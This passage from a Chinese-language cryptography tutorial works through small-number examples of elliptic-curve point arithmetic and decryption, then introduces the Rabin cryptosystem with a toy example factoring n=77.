style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">9</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">7</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>13</mn><mo>+</mo><mn>7</mn><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mn>13</mn><mo separator="true">,</mo><mn>7</mn><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>5</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(13+7)+(13,7)=(5,4)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">7</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">7</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span></span></span></span>。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>5</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mn>13</mn><mo separator="true">,</mo><mn>7</mn><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>17</mn><mo separator="true">,</mo><mn>3</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(5,4)+(13,7)=(17,3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">7</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mclose">)</span></span></span></span></p><p>所以<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><mo stretchy="false">(</mo><mn>5</mn><mo separator="true">,</mo><mn>19</mn><mo stretchy="false">)</mo><mo>−</mo><mo stretchy="false">(</mo><mn>17</mn><mo separator="true">,</mo><mn>3</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m=(5,19)-(17,3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">9</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mclose">)</span></span></span></span>。</p><p>到这一步你可能不知所措了，因为我们之前所有的运算都是两个点之间的加法，那减法要怎么求呢？</p><p>我们可以根据一开始的定义</p><p>设<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo>=</mo><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P=(x,y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span>则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>−</mo><mi>P</mi><mo>=</mo><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mo>−</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">-P=(x,-y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">−</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span>。</p><p>所以<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><mo stretchy="false">(</mo><mn>5</mn><mo separator="true">,</mo><mn>19</mn><mo stretchy="false">)</mo><mo>−</mo><mo stretchy="false">(</mo><mn>17</mn><mo separator="true">,</mo><mn>3</mn><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>5</mn><mo separator="true">,</mo><mn>19</mn><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mo>−</mo><mo stretchy="false">(</mo><mn>17</mn><mo separator="true">,</mo><mn>3</mn><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>5</mn><mo separator="true">,</mo><mn>19</mn><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mn>17</mn><mo separator="true">,</mo><mo>−</mo><mn>3</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m=(5,19)-(17,3)=(5,19)+(-(17,3))=(5,19)+(17,-3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">9</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">9</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">−</span><span class="mopen">(</span><span class="mord">1</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">9</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">−</span><span class="mord">3</span><span class="mclose">)</span></span></span></span></p><p>所以实际上减法就是减数的纵坐标转化为相反数，就能转化加法了。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>=</mo><mn>22</mn><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><mo>−</mo><mn>12</mn><mo stretchy="false">)</mo><mo>=</mo><mn>22</mn><mi mathvariant="normal">/</mi><mn>11</mn></mrow><annotation encoding="application/x-tex">\alpha=22/(-12)=22/11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">2</span><span class="mord">/</span><span class="mopen">(</span><span class="mord">−</span><span class="mord">1</span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">2</span><span class="mord">/</span><span class="mord">1</span><span class="mord">1</span></span></span></span>。这里我们又遇到了一个比较特别的情况，上下数可以整除了，但是我们应该将将除法转变为乘上分母的逆。11的逆是21。则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>=</mo><mn>22</mn><mo>∗</mo><mn>21</mn><mo>=</mo><mo stretchy="false">(</mo><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mo>−</mo><mn>2</mn><mo stretchy="false">)</mo><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">\alpha=22*21=(-1)*(-2)=2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">−</span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>。竟然与直接除是一样的结果。</p><blockquote><p>以后如果发现分母和分子能够直接整除，便可以直接除得到结果，如果发现不能整除，便将乘以分母的逆。</p></blockquote><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>R</mi></msub><mo>=</mo><msup><mn>2</mn><mn>2</mn></msup><mo>−</mo><mn>22</mn><mo>=</mo><mo>−</mo><mn>18</mn><mo>=</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">x_R=2^2-22=-18=5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mord">8</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>y</mi><mi>R</mi></msub><mo>=</mo><mn>2</mn><mo stretchy="false">(</mo><mn>5</mn><mo>−</mo><mn>5</mn><mo stretchy="false">)</mo><mo>−</mo><mn>19</mn><mo>=</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">y_R=2(5-5)-19=4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mopen">(</span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">5</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">9</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span>。</p><p>所以最后的结果为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>5</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(5,4)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span></span></span></span>。和一开始的信息相同，解密成功。</p><h2 id="rabin"><a class="markdownIt-Anchor" href="#rabin"></a> Rabin</h2><p>Rabin密码利用的数学原理是离散平方根问题，实际上就是合数模下二次剩余求解难的问题。</p><p>它的形式非常简单，选择两个模四余数3的素数，做为私钥，将它们的乘积做为公钥。</p><p>即，私钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(p,q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span>。公钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>。</p><p>加密也十分简单。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mo>=</mo><msup><mi>m</mi><mn>2</mn></msup><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c=m^2\ (mod\ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></p><p>解密的话就是求解同余方程<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>m</mi><mn>2</mn></msup><mo>=</mo><mi>c</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m^2=c(mod\ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>。把m求出来即可。</p><p>由数学基础知</p><p><img src="https://upyun.wuuconix.link/image-20211018122617567.png" alt="解密" /></p><p>也就是将模n的同余式转化为求一个同余式组。由于模4余三的素数的解可以直接写出来。然后再根据解出来的信息根据中国剩余定理求出解。一般的解会有4个。</p><h3 id="rabin举例"><a class="markdownIt-Anchor" href="#rabin举例"></a> Rabin举例</h3><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mo>=</mo><mn>77</mn></mrow><annotation encoding="application/x-tex">n=77</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">7</span><span class="mord">7</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mo>=</mo><mn>23</mn></mrow><annotation encoding="application/x-tex">c=23</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">3</span></span></span></span>。</p><p>这里我们可以轻松得将合数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>77</mn></mrow><annotation encoding="application/x-tex">77</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">7</span><span class="mord">7</span></span></span></span>分解为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">7</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>11</mn></mrow><annotation encoding="application/x-tex">11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">1</span></span></span></span>。7和11正好都是模4余3得素数，相当于白给了。实际上的Rabin密码肯定不会用这么简单的n，肯定是两个大素数相乘的，所以这个Rabin密码看起来利用的数学问题是离散平方根，其基础还是分解问题，如果可以轻易的分解，那就和这道题一样白给了。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>m</mi><mn>2</mn></msup><mo>=</mo><mn>23</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>77</mn></mrow><annotation encoding="application/x-tex">m^2=23\ mod\ 77</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">3</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">7</span><span class="mord">7</span></span></span></span></p><p>可以转化为以下两个式子</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>m</mi><mn>2</mn></msup><mo>=</mo><mn>23</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>11</mn></mrow><annotation encoding="application/x-tex">m^2=23\ mod\ 11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">3</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">1</span><span class="mord">1</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>m</mi><mn>2</mn></msup><mo>=</mo><mn>23</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>7</mn></mrow><annotation encoding="application/x-tex">m^2 = 23\ mod\ 7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord 